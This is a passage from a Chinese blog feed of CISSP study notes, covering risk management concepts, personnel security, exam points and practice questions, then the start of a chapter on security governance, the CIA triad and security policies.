任何可能发生的、为组织或某种特定资产带来所不希望的或不想要结果的事情都被称为威胁。</li><li><strong>脆弱性</strong> 资产中的弱点或防护措施/对策的缺乏被称为脆弱性。</li><li><strong>暴露</strong> 暴露是指由于威胁而容易造成资产损失，脆弱性会被或将被威胁主体或威胁事件加以利用的可能性是存在的。</li><li><strong>风险</strong> 风险是某种威胁利用脆弱性并导致资产损害的可能性，是对可能性、概率或偶然性的评估。</li><li><strong>防护措施</strong> 防护措施或对策是指能消除脆弱性或对付一种或多种特定威胁的任何方法。</li><li><strong>攻击</strong> 攻击指的是威胁主体对脆弱性的利用。</li><li><strong>破坏</strong> 破坏是指发生安全机制被威胁主体绕过或阻挠的事情。<img src="/notes/cissp学习笔记（2）——人员安全和风险管理概念/风险的元素.png" title="[风险的元素]"></li></ul><h4 id="2-3-2-识别威胁和脆弱性"><a href="#2-3-2-识别威胁和脆弱性" class="headerlink" title="2.3.2 识别威胁和脆弱性"></a>2.3.2 识别威胁和脆弱性</h4><p>　　威胁可能来自任何地方。<br>编制威胁列表时，需要考虑以下各项：</p><ul><li>病毒</li><li>级联错误(一系列逐步上升的错误)和相关性错误(由于依赖的事件或事物不存在而引起)</li><li>己授权用户的犯罪行为</li><li>运动现象(振动、炸裂声等)</li><li>有企图的攻击</li><li>重组</li><li>己授权的用户疾病或传染病</li><li>黑客</li><li>不满的员工</li><li>用户错误</li><li>自然灾害(地震、水灾、火灾、火山爆发、咫风、龙卷风、海啸等)</li><li>物理损坏(碎裂、抛射、线缆被切断等)</li><li>数据、资源或服务的误用</li><li>对数据分类或安全策略的改变或危害</li><li>政府、党派或军队的入侵或限制</li><li>处理错误、缓冲区溢出</li><li>滥用个人特权</li><li>温度失控</li><li>能量异常( 静电噪音、EM 脉冲、无线电频率、电源损耗、电涌等)</li><li>数据丢失</li><li>信息战争</li><li>破产或改变/中断业务活动</li><li>编码/编程错误</li><li>入侵(物理的或逻辑的)</li><li>环境因素(存在天然气、液体、生物等)</li><li>设备故障</li><li>物理盗窃</li><li>社会工程学</li></ul><h4 id="2-3-3-风险评估-分析"><a href="#2-3-3-风险评估-分析" class="headerlink" title="2.3.3 风险评估/分析"></a>2.3.3 风险评估/分析</h4><p>　　目前有两种风险评估方法： 定量的风险分析和定性的风险分析。定量的风险分析把真实的货币价值分配给损失的资<br>产。定性的风险分析把主观的和无形的价值分配给损失的资产。</p><ol><li>定量的风险分析</li><li>定性的风险分析</li></ol><h4 id="2-3-4-风险分配-接受"><a href="#2-3-4-风险分配-接受" class="headerlink" title="2.3.4 风险分配/接受"></a>2.3.4 风险分配/接受</h4><p>风险分析的结果包括：</p><ul><li>所有资产的完整且详细的评估。</li><li>所有威肋和风险、发生概率以及一旦发生的损失范围的详细列表。</li><li>针对特定威胁的并且标识出有效性与ALE的防护措施和对策列表。</li><li>每种防护措施的成本/效益分析。</li></ul><h4 id="2-3-5-对策的选择和评估"><a href="#2-3-5-对策的选择和评估" class="headerlink" title="2.3.5 对策的选择和评估"></a>2.3.5 对策的选择和评估</h4><p>　　对策和防护措施需要根据业务任务的上下文进行评估。</p><h4 id="2-3-6-实施"><a href="#2-3-6-实施" class="headerlink" title="2.3.6 实施"></a>2.3.6 实施</h4><p>　　安全控制、对策和防护措施可以通过行政管理性、逻辑/技术性或物理性控制来实现。</p><h4 id="2-3-7-控制的类型"><a href="#2-3-7-控制的类型" class="headerlink" title="2.3.7 控制的类型"></a>2.3.7 控制的类型</h4><ul><li>1.威慑</li><li>2.预防</li><li>3.检测</li><li>4.补偿</li><li>5.纠正</li><li>6.恢复</li><li>7.指令</li></ul><h4 id="2-3-8-监控和测量"><a href="#2-3-8-监控和测量" class="headerlink" title="2.3.8 监控和测量"></a>2.3.8 监控和测量</h4><h4 id="2-3-9-资产评估"><a href="#2-3-9-资产评估" class="headerlink" title="2.3.9 资产评估"></a>2.3.9 资产评估</h4><p>对有形资产和无形资产的估值：</p><ul><li>购置成本</li><li>开发成本</li><li>经营或管理成本</li><li>维护或保养成本</li><li>获得资产的成本</li><li>保护或维持资产的成本</li><li>所有者和用户的价值</li><li>竞争者的价值</li><li>知识产权或资产的价值</li><li>市场评估(可维持的价格)</li><li>产品换代成本</li><li>生产率提升或下降</li><li>资产存在和损失的运营成本</li><li>资产损失责任</li><li>用处</li></ul><h4 id="2-3-10-持续改进"><a href="#2-3-10-持续改进" class="headerlink" title="2.3.10 持续改进"></a>2.3.10 持续改进</h4><p>　　安全性总是在不断变化。因此，随着时间的推移，任何己经实现的安全解决方案都需要更新和更改。如果不是由选定的对策提供连续的完善路径，那么应该将其替换为可以为安全性提供灵活改进的对策。</p><h4 id="2-3-11-风险框架"><a href="#2-3-11-风险框架" class="headerlink" title="2.3.11 风险框架"></a>2.3.11 风险框架</h4><p>风险管理系统有以下特点：</p><ul><li>通过实施强劲且持续不断的监管过程促进实时风险管理概念和不间断的信息系统授权概念的提升。</li><li>鼓励通过自动化操作，向高层领导者提供必要的信息以帮助他们在组织信息系统方面做出基于风险且划算的决定，以支持他们的核心任务和商业功能。</li><li>将信息安全与公司系统结构以及系统开发生命周期相结合。</li><li>强调选择、实施、评估、安全控制的监管以及信息系统的授权。</li><li>通过风险管理(功能)将信息系统层面的风险管理过程与组织层面的风险管理过程相联系。</li></ul><p>为部署在组织信息系统中井使用这些系统的安全控制建立责任和问责一体化制度。风险管理系统的步骤包括：</p><ul><li>分类</li><li>选择</li><li>实施</li><li>评估</li><li>授权</li><li>监控</li></ul><img src="/notes/cissp学习笔记（2）——人员安全和风险管理概念/风险管理框架的6个步骤.png" title="[风险管理框架的6个步骤]"><h3 id="2-4-建立和管理信息安全教育、培训和意识"><a href="#2-4-建立和管理信息安全教育、培训和意识" class="headerlink" title="2.4 建立和管理信息安全教育、培训和意识"></a>2.4 建立和管理信息安全教育、培训和意识</h3><p>　　安全培训的先决条件是意识。培养安全意识的目标是要将安全放到首位并让用户认识到这一点。意识在整个组织机构之间建立了通用的安全理解基线或基础。</p><h3 id="2-5-管理安全功能"><a href="#2-5-管理安全功能" class="headerlink" title="2.5 管理安全功能"></a>2.5 管理安全功能</h3><ul><li>安全必须符合成本效益原则</li><li>安全必须可度量</li><li>安全机制本身和安全治理过程都会消耗资源</li><li>安全管理功能包括信息安全策略的开发和执行</li></ul><h3 id="2-6-考试要点"><a href="#2-6-考试要点" class="headerlink" title="2.6 考试要点"></a>2.6 考试要点</h3><ul><li><strong>知道隐私如何被放入IT 安全领域</strong> 知道隐私的多重含主U定义，为什么保护它是非常重要的，以及围绕隐私尤其是在工作环境中的隐私的各种问题。</li><li><strong>能够讨论安全的第三方治理</strong> 第三方治理的监督制度可以根据法律、法规、行业标准或许可要求进行强制执行。</li><li><strong>能够定义整体的风险管理</strong> 风险管理的过程如下： 识别可能造成数据损坏或泄漏的因素、根据数据的价值与对策的成本来评估这些因素，以及实现能够减轻或降低风险的有成本效益的解决方案。通过执行风险管理，就能够为降低整体风险奠定基础。</li><li><strong>理解风险分析及涉及的要素</strong> 执行风险分析能够为上层管理者提供详细、必要的依据，从而使其决定哪些风险应当被削弱、哪些风险应当被转移以及哪些风险应当被接受。为了全面评估风险和随后采取恰当的防范措施，就必须分析下列要素： 资产、资产估值、威胁、脆弱性、暴露、风险、己发生的风险、防护措施、对策、攻击和突破。</li><li><strong>知道如何评估威胁</strong> 威胁可能有很多来源，包括町、人和自然界。以团队的形式评估风险以便提供范围最广的视角。通过从各个角度全面地评估风险，就可以减少系统的脆弱性。</li><li><strong>理解定量的风险分析</strong> 定量的风险分析关注硬性指标和百分比。全部使用定量分析是不可能的，因为风险的某些方面是无形的。定量的风险分析过程涉及： 资产估值和威胁识别，接着确定威胁发生的潜在频率和损失，结果是防护措施的成本/效益分析。</li><li><strong>能够解释暴露因子(EF)的概念</strong> 暴露因子是定量风险分析的一个元素，表示组织的某种特定资产被己发生的风险损坏后造成损失的百分比。通过计算暴露因子，能够较好地实现风险管理策略。</li><li><strong>了解单一损失期望(SLE)井知道如何计算</strong> SLE是定量风险分析的一个元素，表示与针对特定资产的单个己发生风险相关联的成本。计算SLE时，可以使用公式： SLE=资产价值(AV) *暴露因子(EF)。</li><li><strong>理解年发生比率(ARO)</strong> ARO是定量风险分析的一个元素，指的是特定威胁或风险在一年内将会发生(也就是成为现实)的预计频率。理解ARO能够进一步计算风险和采取适当的防范措施。</li><li><strong>了解年度损失期望(ALE)井知道如何计算</strong> ALE是定量风险分析的一个元素，指的是针对某种特定的资产，所有己实施的威胁每年可能造成的损失成本。计算ALE 时可以使用公式： ALE=单一损失期望(SLE)*年发生比率(ARO)。</li><li><strong>了解评估防护措施的公式</strong> 除了确定防护措施每年的成本外，还必须计算实现措施后资产的ALE。为此，可以使用下面这个公式： 实现防护措施前的ALE- 实现防护措施后的ALE-每年的防护措施成本=公司防护措施的价值，即(ALEl - ALE2) - ACS。</li><li><strong>理解定性的风险分析</strong> 定性的风险分析更多是根据场景而不是根据计算。这种方式不是为可能发生的损失分配准确的货币价值，而是按程度将威胁分成等级，从而评估其风险、成本和影响。这些分析结果可以帮助那些负责制定风险管理策略的人。</li><li><strong>理解Delphi技术</strong> Delphi技术只是一个简单的匿名反馈和响应过程，这个过程被用于达成一致意见。达成的一致意见为责任方提供了正确评估风险和实施解决方案的机会。</li><li><strong>了解处理风险的选项</strong> 降低风险或风险缓解是防护措施和对策的实现。风险转让或转移风险是把风险带来的损失成本转移给另一个实体或组织。购买保险就是转让或转移风险的一种常见形式。接受风险是因为管理层对可能采用的防护措施进行了成本/效益分析上的评估，并且确定对策的戚本远远超过风险可能造成的损失的成本，还意味着管理层己经同意接受风险发生所造成的结果和损失。</li><li><strong>能够解释总风险、剩余风险和控制间隙</strong> 总风险指的是在没有实现防护措施的情况下，组织将要面对的风险数量。计算总风险的公式是： 威胁<em>脆弱性</em>资产价值=总风险。剩余风险是管理层选择接受而不是缓解的风险。总风险和剩余风险之间的差值被称为控制间隙，控制间隙是指通过实现防护措施被减少的风险数量。计算剩余风险的公式是： 总风险控制间隙=剩余风险。</li><li><strong>理解控制类型</strong> “访问控制”这一术语指的是一系列执行以下任务的控制=确保只有授权用户能够登录而未授权用户不能访问资源。控制类型包括预防、测探、校正、警报、恢复、指令和补偿控制。按执行方式控制可分为：行政管理性控制、逻辑性控制或物理性控制。</li><li><strong>理解雇佣新员工的安全含义</strong> 为了制定合适的安全计划，必须具有工作描述、工作分类、工作任务、工作职责、阻止共谋、候选人筛选、背景调查、安全许可、雇佣协议和竞业禁止协议的标准。通过部署这些机制，确保新雇佣的人员意识到要求的安全标准，从而保护组织的资产。</li><li><strong>能够解释职责分离</strong> 职责分离属于安全概念，指的是将关键的、重要的和敏感的工作任务分配给不同的人。通过分离责任这种方式，就可以确保任何人不可能危及系统安全。</li><li><strong>理解最小特权原则</strong> 最小特权原则表明，在安全环境中，用户应该被授予完成要求的工作任务或工作职责所必需的最少访问权限。通过限制用户只能访问完成工作任务所要求的那些资源，就能限制敏感信息的脆弱性。</li><li><strong>了解岗位轮换和强制性休假是必要的</strong> 岗位轮换有两个作用： 提供了一种知识元余类型： 人员流动可以减少伪造、数据更改、偷窃、阴谋破坏和信息滥用的风险。一到两个星期的强制性休假被用于审计和认证员工的工作任务和权限。这种做法往往比较容易发现滥用、欺诈或疏忽行为。</li><li><strong>理解供应商控制、顾问控制和承包商控制</strong> 利用供应商控制、顾问控制以及承包商控制来确定这个主要组织外部的不同实体、个人或机构的绩效水平、期望值高低、薪酬水平以及影响程度。通常情况下，服务水平协议(SLA) 的文件或政策中会对这些控制进行明确规定。</li><li><strong>能够解释适当的解雇策略</strong> 解雇策略定义了解雇员工的过程，应当包括： 始终有一位证人在场，禁止员工访问网络，进行离职面谈，护送员工离开办公室，交回安全标志和门卡，返还公司的财产。</li><li><strong>了解如何实现安全意识培训</strong> 在真正的培训开始之前，必须让用户树立主人翁的安全意识。一旦树立了安全意识，培训或教育员工执行工作任务和遵守安全策略就可以开始了。所有的新员工都需要进行培训。这样他们才能够遵守安全策略中规定的所有标准、指导方针和步骤。教育是一项更细致的工作，学生/用户需要学习比他们完成工作任务实际所需知识多得多的知识。教育往往与用户参加认证考试或寻求职务晋升相关联。</li><li><strong>理解如何管理安全功能</strong> 为了实现管理安全功能，组织必须采取恰当且充分的安全治理。执行风险评估以驱动安全政策的施行是最明显、最直接的安全功能管理例子。同时这也和预算、度量、资源以及信息安全策略以及评估安全系统的完整性及有效性息息相关。</li><li><strong>了解风险管理框架的6个步骤</strong> 风险管理框架的6 个步骤分别是： 分类、选择、实施、评估、授权和监控。</li></ul><h3 id="2-7-复习题"><a href="#2-7-复习题" class="headerlink" title="2.7 复习题"></a>2.7 复习题</h3><ol><li><p>以下哪一项是任何安全解决方案中最薄弱的元素?<br>A. 软件产品<br>B. 互联网连接<br>C. 安全策略<br>D. 人</p></li><li><p>当试图雇佣新员工时，首先要做什么?<br>A. 创建工作描述<br>B. 设置职位分类<br>C. 审查候选人<br>D. 要求简历</p></li><li><p>以下哪一项是离职面谈的主要目的?<br>A. 返还离职员工的个人物品。<br>B. 审查保密协议。<br>C. 评估离职员工的表现。<br>D. 取消离职员工的网络访问账户</p></li><li><p>当员工被解雇时，接下来应该做什么?<br>A. 在他们被正式解雇前几个小时通知员工。<br>B. 一旦他们被通知解雇，就禁用员工的网络访问权。<br>C. 发送一封广播的电子邮件通知大家，某个员工将被解雇。<br>D. 等到你和雇员是楼里唯一剩下的人时宣布解雇。</p></li><li><p>如果一个组织与外部实体签订合同，提供关键业务功能或服务，例如账户或技术支持。用于<br>确保这些实体能够提供充分的安全性的流程被称为什么?<br>A. 资产识别<br>B. 第三方管理<br>C. 离职审查<br>D. 定性分析</p></li><li><p>___的一部分是业务流程和组织策略的逻辑和实际调查。这个过lV策略审查确保定期的和执行的业务任务、系统和方法是可行、有效的，并且具有成本效益，但最重要的是(至少相对于安全治理)，他们通过减少脆弱性和避免、减少或缓解风险来支持安全性。<br>A. 混合评估<br>B. 风险规避过程<br>C. 对策选择<br>D. 文档审查</p></li><li><p>以下哪一项不是正确的?<br>A. IT安全只能针对逻辑性或技术性的攻击提供保护。<br>B. 实现风险管理目标的过程被称为风险分析。<br>C. 对于IT基础设施的风险是以所有计算机为基础的。<br>D. 资产是在业务流程或任务中使用的任何东西。</p></li><li><p>下列哪一项不是风险分析过程中的元素?<br>A. 为风险分析环境。<br>B. 为防护措施创建成本/收益报告并提交给上层管理者。<br>C. 选择适当的防护措施并实施它们。<br>D. 评估每个威胁事件，及其发生和造成损害的成本和可能性。</p></li><li><p>在风险分析中，下列哪一项一般不会被认为是资产?<br>A. 开发过程<br>B. IT基础设施<br>C. 专有的系统资源<br>D. 用户的个人文件</p></li><li><p>以下哪一项表示偶然的或有意的漏洞利用?<br>A. 威胁事件<br>B. 风险<br>C. 威胁代理<br>D. 破坏</p></li><li><p>当没有或缺乏防护措施和对策时，会存在什么?<br>A. 脆弱性<br>B. 暴露<br>C. 风险<br>D. 渗透</p></li><li><p>下列哪一项不是有效的风险定义?<br>A. 几率、可能性或机会的评估<br>B. 移除脆弱性或防止一个(或多个)特定攻击发生的任何事情<br>C. 风险=威胁*脆弱性<br>D. 每个暴露实例</p></li><li><p>当评估防护措施时，在大多数情况下应遵循什么规则?<br>A. 资产年度损失期望成本不应该超过年度的保护成本。<br>B. 防护措施的年度成本应该等于资产价值。<br>C. 防护措施的年度成本不应该超过资产的年度损失期望。<br>D. 防护措施的年度成本不应该超过安全预算的10%。</p></li><li><p>单一损失期望是怎样计算的?<br>A. 威胁+脆弱性<br>B. 资产价值<em>暴露因子<br>C. 年发生比率</em>脆弱性<br>D. 年发生比率<em>资产价值</em>暴露因子</p></li><li><p>一家公司的防护措施的价值怎样计算?<br>A. 使用防护措施前的ALE-使用防护措施后的ALE 防护措施的年度成本<br>B. 防护前ALE*防护措施的ARO<br>C. 执行防护后ALE+年度防护价值-控制间隙<br>D. 总风险一控制间隙</p></li><li><p>什么安全控制直接关注于防止共谋?<br>A. 最小特权原则<br>B. 工作描述<br>C. 职责分离<br>D. 定量的风险分析</p></li><li><p>什么样的流程或事件通常是由组织主持，针对具有相似工作职能的员工群体?<br>A. 教育<br>B. 意识<br>C. 培训<br>D. 解雇</p></li><li><p>以下哪一项没有具体或直接关系到组织的安全功能管理?<br>A. 员工工作满意度<br>B. 度量<br>C. 信息安全策略<br>D. 预算</p></li><li><p>由于缺少灭火器，你意识到一场火灾的威胁和脆弱性，然后开始执行风险分析。基于这些<br>信息，下列哪些是可能的风险?<br>A. 病毒感染<br>B. 设备损坏<br>C. 系统故障<br>D. 未授权地访问机密信息</p></li></ol><p>20 通过特定的威胁/脆弱性/风险关系，己经执行了基本的定量风险分析。选择一个可能的对策。当再次计算时，下列哪个因素会变化?<br>A. 暴露因子<br>B. 单一损失期望<br>C. 资产价值<br>D. 年发生比率</p>]]></content>
    
    <summary type="html">
    
      本文为cissp中人员安全和风险管理概念章节的学习笔记
    
    </summary>
    
      <category term="notes" scheme="https://www.diyz.bid/categories/notes/"/>
    
    
      <category term="cissp" scheme="https://www.diyz.bid/tags/cissp/"/>
    
      <category term="学习笔记" scheme="https://www.diyz.bid/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>cissp学习笔记（1）——通过原则和策略的安全治理</title>
    <link href="https://www.diyz.bid/notes/cissp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%881%EF%BC%89%E2%80%94%E2%80%94%E9%80%9A%E8%BF%87%E5%8E%9F%E5%88%99%E5%92%8C%E7%AD%96%E7%95%A5%E7%9A%84%E5%AE%89%E5%85%A8%E6%B2%BB%E7%90%86/"/>
    <id>https://www.diyz.bid/notes/cissp学习笔记（1）——通过原则和策略的安全治理/</id>
    <published>2018-09-06T06:29:47.000Z</published>
    <updated>2018-10-11T10:12:52.873Z</updated>
    
    <content type="html"><![CDATA[<p>在本章的考试大纲内容有：<br>安全和风险管理(例如安全、风险、合规性、法律、法规、业务连续性)</p><ul><li>A. 理解和应用机密性、完整性和可用性的概念</li><li>B. 应用安全治理原则，通过：<ul><li>B.1 安全功能与战略、目标、使命和愿景的一致(例如商业案例、预算和资源)</li><li>B.2 组织的流程(例如并购、剥离和治理委员会)</li><li>B.3 安全角色和职责</li><li>B.4 控制架构</li><li>B.5 应尽关注</li><li>B.6 应尽职责</li></ul></li><li>F. 开发和实现文档化的安全策略、标准、程序和指南</li><li>J. 理解和应用威胁建模<ul><li>J.1 识别威胁(例如竞争对手、供应商、雇员和值得信赖的伙伴)</li><li>J.2 确定和用图表示潜在攻击(例如社会工程学、欺骗)</li><li>J.3 执行降低分析</li><li>J.4 修复威胁的技术和流程(例如软件架构和操作)</li></ul></li><li>K. 把安全风险考虑到收购策略和实践中<ul><li>K.l 硬件、软件和服务</li><li>K.2 第三方评估和监控(例如现场评估、文件传递和审查、流程/策略审查)</li><li>K.3 最小化安全需求</li><li>K.4 服务级别需求</li></ul></li></ul><h3 id="1-1-理解和应用机密性、完整性和可用性的概念"><a href="#1-1-理解和应用机密性、完整性和可用性的概念" class="headerlink" title="1.1 理解和应用机密性、完整性和可用性的概念"></a>1.1 理解和应用机密性、完整性和可用性的概念</h3><p>　　安全的三要素：C(机密性-Confidentiality)I(完整性-Integrity)A(可用性-Availability)</p><h4 id="1-1-1-机密性"><a href="#1-1-1-机密性" class="headerlink" title="1.1.1 机密性"></a>1.1.1 机密性</h4><p>　　如果安全机制提供机密性，那么它就为限制未授权主体不能访问数据、客体或资源提供了高级别保证。如果存在对机密性的威胁，那么就有可能发生未授权的泄漏。<br>机密性的其他概念、条件和特征包括：</p><ul><li><strong>敏感性</strong> 敏感性是指信息的品质，如果这种信息被披露，就可能会造成伤害或损坏。维护敏感信息的机密性有助于预防伤害或损坏。</li><li><strong>自主性</strong> 自主性是一种决策行为，操作员可以凭这种权利影响或控制信息的披露，以便将伤害或损坏降到最低。</li><li><strong>关键性</strong> 信息的关键级别是对其关键性的评测。关键级别越高，越需要保持信息的机密性。高级别的关键性对一个组织的运营和功能是必不可少的。</li><li><strong>隐蔽性</strong> 隐蔽是一种隐蔽或防止披露的行为。隐蔽通常被视为覆盖、混淆或干扰的一种手段。</li><li><strong>保密性</strong> 保密是一种保守秘密或防止信息泄露的行为。</li><li><strong>隐私性</strong> 隐私是指要保持信息处于机密状态，这些可能是个人识别信息，或是如果泄露就可能对某人造成伤害、尴尬或丢人的信息。</li><li><strong>隐藏性</strong> 隐藏就是把信息存储到一个偏僻的位置。这个位置还可以附加严格的访问控制。隐藏有助于实施机密性保护。</li><li><strong>隔离性</strong> 隔离是指把特定信息与其他信息分隔开来的行为。隔离可以用来防止信息混杂或信息泄露。</li></ul><h4 id="1-1-2-完整性"><a href="#1-1-2-完整性" class="headerlink" title="1.1.2 完整性"></a>1.1.2 完整性</h4><p>　　为了维护完整性，客体必须保持自身的正确性，并且只能由被授权的主体进行有意修改。<br>我们可以从下列三个方面查看完整性：</p><ul><li>应该禁止未授权的主体执行修改操作。</li><li>应该禁止经过授权的主体执行未授权的修改操作，例如失误。</li><li>客体应当内外保持一致，这样它们的数据才能正确井真实地反映现实情况，并且与任何子客体、同等客体或父客体的关系都是有效的、一致的和可检验的。</li></ul><h4 id="1-1-3-可用性"><a href="#1-1-3-可用性" class="headerlink" title="1.1.3 可用性"></a>1.1.3 可用性</h4><p>　　可用性指的是经过授权的主体被及时准许和不间断地访问客体。</p><h4 id="1-1-4-其他安全概念"><a href="#1-1-4-其他安全概念" class="headerlink" title="1.1.4 其他安全概念"></a>1.1.4 其他安全概念</h4><ol><li><p>身份标识<br>身份标识是一个过程，在这个过程中，主体会表明身份，并且开启可问责性。主体必须向系统提供身份，从而启动身份认证、授权和可问责性的过程。</p></li><li><p>身份认证<br>身伤1证要求来自主体的附加信息必须完全对应于被表明的身份。</p></li><li><p>授权<br>授权的过程确保被请求的活动或客体访问，可以获得通过身份认证和指派的权利和特权。</p></li><li><p>审计<br>审计或监控是程序化方式，通过这种方式，主体在系统中经过身份认证的行为是可问责的。</p></li><li><p>可问责性<br>通过审计、授权、身份认证与身份标识这些安全服务和机制，将联机身份的活动与某个人联系在一起，就可以建立可问责性。</p></li><li><p>不可否认性<br>不可否认性确保活动或事件的主体无法否认所发生的事件。不可否认性能够防止主体宣称自己没有发送消息、没有执行过某项活动或者不是某个事件的起因。</p></li></ol><h4 id="1-1-5-保护机制"><a href="#1-1-5-保护机制" class="headerlink" title="1.1.5 保护机制"></a>1.1.5 保护机制</h4><ol><li><p>分层<br>分层只是简单地使用连续的多重控制，也被称为深层防御。使用连续分层法而不是并行分层法，这一概念非常重要。通过连续方式执行安全限制意味着使用线性的方式依次执行。只有通过一系列配置，才能由每个安全控制对攻击进行扫描、评估或缓解。单个安全控制方法的失败不会使整个解决方案失效。如果安全控制是以并行方式执行的，某个威胁就可能穿过单个检查点，从而无法消除该威胁特殊的恶意活动。</p></li><li><p>抽象<br>抽象是为提高效率而使用的。相似的元素被放入组、类别或角色(被整体性授予安全控制、限制或权限)中。因此，当为客体分类或为主体分配角色时，就需要使用抽象的概念。</p></li><li><p>数据隐藏<br>数据隐藏通过将数据置于主体不可访问或无法看到的存储空间，从而防止主体发现或访问数据。</p></li><li><p>加密<br>加密可以具有很多形式，并且能够被应用于所有的电子通信类型，包括文本、音频和视频文件以及应用程序本身。</p></li></ol><h3 id="1-2-应用安全治理原则"><a href="#1-2-应用安全治理原则" class="headerlink" title="1.2 应用安全治理原则"></a>1.2 应用安全治理原则</h3><p>　　安全治理是实践行为的集合，这些实践都与支持、定义和指导组织的安全工作相关。安全治理与组织和IT治理密切相关，而且经常交织在一起。这三种治理的目标一般是相同或相关的。</p><h4 id="1-2-1-安全功能战略、目标、任务和愿景的一致"><a href="#1-2-1-安全功能战略、目标、任务和愿景的一致" class="headerlink" title="1.2.1 安全功能战略、目标、任务和愿景的一致"></a>1.2.1 安全功能战略、目标、任务和愿景的一致</h4><p>　　解决安全管理计划编制的最有效方法是采用自上而下的方式。上层、高层或管理部门负责启动和定义组织的安全策略。安全策略为组织中较低级别的人员指出了方向。中层管理部门的职责是在安全策略的指导下制定标准、基准、指导方针和程序。接着，操作管理者或安全专家负责实现在安全管理文档中规定的配置要求。最后，最终用户必须遵守组织制定的所有安全策略。<br>安全管理计划编制的元素包括：</p><ul><li>定义安全角色</li><li>规定如何管理安全性、谁负责安全性以及如何测试安全性的效力</li><li>开发安全策略</li><li>执行风险分析</li><li>以及要求对员工进行安全教育</li></ul><h4 id="1-2-2-组织流程"><a href="#1-2-2-组织流程" class="headerlink" title="1.2.2 组织流程"></a>1.2.2 组织流程</h4><p>1 . 变更控制/变更管理<br>　　变更管理应该用于监督系统每个方面发生的变更，包括硬件配置、操作系统和应用软件的变更。变更管理应该被包含在设计、开发、测试、评估、实现、分发、演变、发展、持续操作以及修改中。变更管理不仅需要每个组件和配置的详细目录，而且还需要为每个系统组件(从硬件到软件，以及从配置设置到安全特性)收集和维护完整的文档。<br>配置或变更管理的变更控制过程具有以下几个目标或要求：</p><ul><li>以受监控的和有序的方式实现变更。变更总是处在控制之下。</li><li>包含正式的测试过程，这种过程用于确认变更产生的预期结果。</li><li>所有的变更都可以撤消(也被称为回退或回滚计划/流程)。在变更发生前向用户发出通知，避免降低生产率。</li><li>对变更的影响应进行系统分析。</li><li>变更对能力、功能和性能产生的负面效应最小化。</li><li>变更由变更审批委员会(Change Approval Board ，CAB)审阅和批准。</li></ul><p>2 . 数据分类<br>　　数据分类方案的主要目的是： 根据重要性和敏感性给数据分配标签，对数据安全保护过程进行规范化和层次化。数据分类用于为数据存储、处理和传输提供安全机制，此外还可以确定如何从系统中删除数据和销毁数据。<br>使用数据分类方案具有下列优点：</p><ul><li>能够证明组织致力于保护宝贵的资源和资产。</li><li>能够有助于确定对组织最关键的或最有价值的资产。</li><li>为安全机制的选择提供安全保证。</li><li>常常是遵守规范或法律约束所必需的。</li><li>帮助定义访问级别、授权使用类型，以及对不再有价值的资源进行解除分类和/或对于销毁操作所需的参数。</li><li>在数据生命周期管理中，对于确定数据的存储(保留)时长、使用和销毁是有帮助的。</li></ul><h4 id="1-2-3-安全角色和责任"><a href="#1-2-3-安全角色和责任" class="headerlink" title="1.2.3 安全角色和责任"></a>1.2.3 安全角色和责任</h4><ul><li>高级管理</li><li>安全专家</li><li>数据所有者</li><li>数据管理员</li><li>用户</li><li>审计人员</li></ul><h4 id="1-2-4-控制架构"><a href="#1-2-4-控制架构" class="headerlink" title="1.2.4 控制架构"></a>1.2.4 控制架构</h4><p>　　安全计划步骤中最重要的一步，也是第一步，就是考虑组织想要的安全解决方案的整体控制框架或结构。</p><h3 id="1-3-开发和文档化安全策略、标准、指导方针和程序"><a href="#1-3-开发和文档化安全策略、标准、指导方针和程序" class="headerlink" title="1.3 开发和文档化安全策略、标准、指导方针和程序"></a>1.3 开发和文档化安全策略、标准、指导方针和程序</h3><h4 id="1-3-1-安全策略"><a href="#1-3-1-安全策略" class="headerlink" title="1.3.1 安全策略"></a>1.3.1 安全策略</h4><p>　　规范化的最高层次被称为安全策略。安全策略是一个文挡，这个文档定义了组织所需的安全范围，并且讨论了需要保护的资产以及安全解决方案为提供必要保护而应当涉及的范围。安全策略概述或归纳了组织的安全需求，定义了主要的安全目标，井且概述了组织的安全架构。安全策略还确定了数据处理的主要功能领域，并且澄清和定义了所有相关的术语。安全策略应当清楚地定义为什么安全性很重要以及哪些资产是有价值的。它是实现安全性的战略计划。安全策略应当广泛地概括出用于保护组织切身利益的安全目标和原则。文档讨论了安全性对于日常营业每个方面的重要性以及高层职员对实现安全措施予以支持的重要性。安全策略被用于分配职责、定义角色、指定审计要求、概述实施过程、指明遵循要求以及定义可接受的风险级别。这个文档通常用于证明高层管理部门为保护不遭受入侵、攻击和灾难予以应有的关注。安全策略是强制性的。<br>　　从安全策略可以引出完整安全解决方案所需的其他很多文档或子元素。策略是广泛的概述，而标准、基准、指导方针和程序包括了更加特定的、详细的与实际安全解决方案有关的信息。标准处于安全策略的下一个层次。</p><h4 id="1-3-2-安全标准、基准及指南"><a href="#1-3-2-安全标准、基准及指南" class="headerlink" title="1.3.2 安全标准、基准及指南"></a>1.3.2 安全标准、基准及指南</h4><ul><li>标准为硬件、软件、技术和安全控制方法的统一使用定义了强制性要求。标准提供了操作过程，在这个过程中，整个组织内部统一实现技术和措施。标准是战术文档，定义了达到安全策略指定的目标和总体方向的步骤或方法。</li><li>基准定义了安全性的最低级别，组织中的所有系统都必须达到基准要求。没有达到基准的所有系统都应该被排除在生产系统之外，直至这些系统被提升达到基准要求为止。基准建立了通用的安全状态基础，所有附加的和更严格的安全措施可以被建立在这个基础之上。基准通常是系统特定的，并且往往指的是行业或政府标准.</li><li>指南是规范化安全策略结构的下一个元素。指南提供了如何实现标准和基准的建议，井且能够作为安全专家和用户的操作指南。指南概述了一套方法(包括行动建议)，但并非强制性的。</li></ul><h4 id="1-3-3-安全程序"><a href="#1-3-3-安全程序" class="headerlink" title="1.3.3 安全程序"></a>1.3.3 安全程序</h4><p>　　程序是规范化安全策略结构的最后一个要素。程序是详细的、按部就班的指导文档，它描述了实现特定安全机制、控制或解决方案所需的确切行动。</p><h3 id="1-4-理解和应用威胁建模"><a href="#1-4-理解和应用威胁建模" class="headerlink" title="1.4 理解和应用威胁建模"></a>1.4 理解和应用威胁建模</h3><p>　　